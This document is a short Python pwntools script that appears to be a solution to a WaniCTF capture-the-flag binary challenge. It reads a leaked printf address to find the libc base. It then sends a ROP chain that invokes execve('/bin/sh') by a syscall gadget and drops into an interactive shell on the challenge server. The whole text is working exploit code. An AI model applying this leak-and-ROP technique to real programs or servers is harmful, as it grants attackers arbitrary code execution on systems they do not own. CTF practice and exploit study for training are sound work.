#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"

elf = ELF("./chall", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chal-lz56g6.wanictf.org", 9005)

p.readuntil(b"hint: printf = ")
leak = int(p.readline().decode(), 16)
libc.address = leak - libc.sym["printf"]
log.info(f"libc: 0x{libc.address:x}")

for i in range(3):
    p.sendlineafter(b": ", b"A")
    p.sendlineafter(b": ", b"1.1")
    p.sendlineafter(b": ", b"1.1")

rop = ROP(libc)
rop.rsi = 0
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.rax = constants.SYS_execve
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

p.sendlineafter(b": ", rop.chain())
p.sendlineafter(b": ", b"abc")
p.sendlineafter(b": ", b"efg")

p.interactive()

